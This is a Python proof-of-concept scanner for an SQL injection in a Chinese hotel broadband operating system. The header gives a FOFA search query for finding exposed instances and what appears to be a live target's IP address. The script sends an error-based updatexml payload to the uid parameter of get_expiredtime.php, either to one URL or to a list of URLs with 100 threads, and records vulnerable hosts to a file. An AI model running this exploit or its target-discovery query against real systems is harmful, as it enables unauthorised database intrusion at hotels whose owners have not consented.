# fofa：title="酒店宽带运营系统"
"""poc：GET /user/portal/get_expiredtime.php?uid=1\%27%20and%20updatexml(1,concat(0x7e,(md5(1))),3)--%20q"""
# 183.196.133.74:7071
# c4ca4238a0b923820dcc509a6f75849

# 导包
import sys,argparse
import requests
import json
import urllib3
import warnings
from multiprocessing.dummy import Pool # 多线程的库

# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    test = """
  _________________  .____     
 /   _____/\_____  \ |    |    
 \_____  \  /  / \  \|    |    
 /        \/   \_/.  \    |___ 
/_______  /\_____\ \_/_______ \
        \/        \__>       \/
"""
    print(test)



def main():
    banner()

    # 初始化
    paese = argparse.ArgumentParser(description="安美数字酒店宽带运营系统SQL注入")

    # 添加命令行参数
    paese.add_argument('-u','--url',dest='url',type=str,help="Please input your url")
    paese.add_argument('-f','--file',dest='file',type=str,help="Please input your file")

    # 实体化
    args = paese.parse_args()

    # 判断用户输入的参数是否正确
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 多线程处理
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usag python {sys.argv[0]} -h")




def poc(target):
    link = '/user/portal/get_expiredtime.php?uid=1\%27%20and%20updatexml(1,concat(0x7e,(md5(1))),3)--%20q'

    try:
        res1 = requests.get(url=target,timeout=5,verify=False)
        if res1.status_code == 200:
            res2 = requests.get(url=target+link,timeout=5,verify=False)
            if 'c4ca4238a0b923820dcc509a6f75849' in res2.text:
                print(f'[+]该{target}存在SQL注入')
                with open("result.txt",'a',encoding='utf-8') as f:
                    f.write(f'[+]该{target}存在SQL注入'+'\n')
            else:
                print(f'[-]该{target}不存在SQL注入')
    except:
        print(f"[*]该{target}存在问题，请手工测试")



if __name__ == "__main__":
    main()